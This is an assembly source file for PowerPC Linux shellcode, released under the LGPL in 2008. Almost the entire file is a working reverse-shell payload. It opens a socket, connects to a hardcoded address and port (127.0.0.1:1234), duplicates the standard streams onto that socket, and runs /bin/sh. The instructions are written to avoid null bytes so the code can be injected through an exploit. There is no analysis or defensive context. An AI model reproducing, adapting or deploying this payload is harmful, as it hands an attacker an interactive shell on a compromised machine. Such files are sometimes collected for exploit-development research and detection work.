/*
 *  lin-power-cntsockcode.S
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#include "linux-power.h"

    .globl main

main:

cntsockcode:
    xor     %r31,%r31,%r31
    lil     %r29,__CAL

    # socket

    cal     %r28,-511+1(%r29)
    cal     %r27,-511+2(%r29)
    stu     %r31,-4(%r1)
    stu     %r28,-4(%r1)
    stu     %r27,-4(%r1)
    mr      %r4,%r1
    cal     %r3,__NC_socket(%r29)
    cal     %r0,__NC_socketcall(%r29)
    .long   0x44ffff02
    mr      %r26,%r3

    # connect

    cal     %r25,-511+16(%r29)

    /*
     * The following GPRs result in zeros when used with liu instruction.
     * %r24, %r16, %r8, %r0
     *
     */

    liu     %r23,0x7f00
    oril    %r23,%r23,0x0001
    lil     %r22,0x04d2
    stu     %r23,-4(%r1)
    stu     %r22,-4(%r1)
    st      %r27,-2(%r1)
    mr      %r21,%r1
    stu     %r25,-4(%r1)
    stu     %r21,-4(%r1)
    stu     %r26,-4(%r1)
    mr      %r4,%r1
    cal     %r3,__NC_connect(%r29)
    cal     %r0,__NC_socketcall(%r29)
    .long   0x44ffff02

0:
    # dup2

    mr      %r4,%r27
    mr      %r3,%r26
    cal     %r0,__NC_dup2(%r29)
    .long   0x44ffff02

    ai.     %r27,%r27,-1
    bge     0b

shellcode:
    # lil     %r31,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r3,-511+36(%r30)
    stb     %r5,-511+43(%r30)
    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1
    # cal     %r0,__NC_execve(%r31)
    cal     %r0,__NC_execve(%r29)
    .long   0x44ffff02
    .asciz  "/bin/sh"

